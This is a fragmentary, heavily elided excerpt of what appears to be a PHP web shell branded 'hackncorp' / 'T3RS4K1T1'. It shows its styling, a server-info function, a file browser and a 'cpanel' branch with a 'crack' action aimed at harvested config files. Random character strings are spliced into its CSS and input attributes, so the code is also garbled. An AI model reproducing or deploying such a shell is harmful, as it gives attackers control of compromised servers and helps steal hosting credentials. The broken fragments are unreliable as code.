...
textarea {border: 1px solid deeppink;width: 100%;height: 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVfont-size: 13px;}
...
<link rel="icon" type="image/png" href="https://hackncorp.id/logo.png">
<style>
  html {
    background: black;
    color: deeppink;
...
<center>
<img src="https://kosred.com/a/tfwwng.jpg" width="200" height="200">
<p>
...
function serverinfo() {
	...
	$urlGambar = "https://kosred.com/a/tfwwng.jpg";
...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center>Copyright &copy; ".date("Y")." - <a href='https://hackncorp.id' target='_blank'>".color(1, 2, "T3RS4K1T1")."</a></center>";
}
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print "</textarea><br>
					   ...
					   <input style='width: 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVplaceholder='http://web.com/idx_config/'>
